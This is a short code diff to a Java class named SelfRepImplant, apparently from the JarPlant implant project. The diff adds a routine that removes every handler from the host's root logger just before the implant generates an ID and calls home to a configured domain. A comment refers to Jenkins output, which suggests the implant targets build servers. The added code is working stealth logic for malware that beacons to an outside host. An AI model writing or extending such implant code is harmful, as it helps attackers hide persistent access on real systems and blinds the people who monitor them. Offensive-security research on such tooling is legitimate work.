@@ -77,6 +77,12 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             return;
         }
 
+        /*
+         * Crudely prevent JarPlant from flooding the log/stdout.
+         * If it's eerily quiet in the Jenkins output, try removing this line.
+         */
+        disableAllLogging();
+
         String id = generateRandomId();
         callHpme(CONF_DOMAIN, "hello", id);
 
@@ -241,5 +247,12 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
 
         return hexString.toString();
+    }
+
+    private static void disableAllLogging() {
+        Logger rootLogger = Logger.getLogger("");
+        for (Handler handler : rootLogger.getHandlers()) {
+            rootLogger.removeHandler(handler);
+        }
     }
 }
